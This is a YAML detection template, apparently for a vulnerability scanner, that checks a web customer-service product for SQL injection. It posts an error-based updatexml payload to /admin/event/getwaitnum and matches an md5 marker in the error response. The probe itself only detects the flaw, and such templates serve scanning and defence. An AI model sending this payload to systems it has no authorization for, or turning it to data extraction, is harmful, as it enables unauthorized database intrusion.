name: yaml-poc-zjhejiang-dianqilai_kefu-sql_injection-CT-747647
binding: 21892ee6-f57c-4b2d-b365-e34b75e11fe6
detail:
    author: lianjian.chen
    vulnerability:
        id: e7af243f-a1be-41f0-8f17-0796a0a83403
        level: high
    warning: Harmless
transport: http
set:
    r1: randomInt(40000, 44800)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /admin/event/getwaitnum
            headers:
                Content-Type: application/x-www-form-urlencoded
                X-Requested-With: XMLHttpRequest
            body: business_id[]=exp&business_id[]=+and+updatexml(1,concat(0x7e,md5({{r1}})),1)&groupid=1
        expression: response.status == 500 && response.body.bcontains(bytes(substr(md5(string(r1)), 0, 31)))
expression: r0()
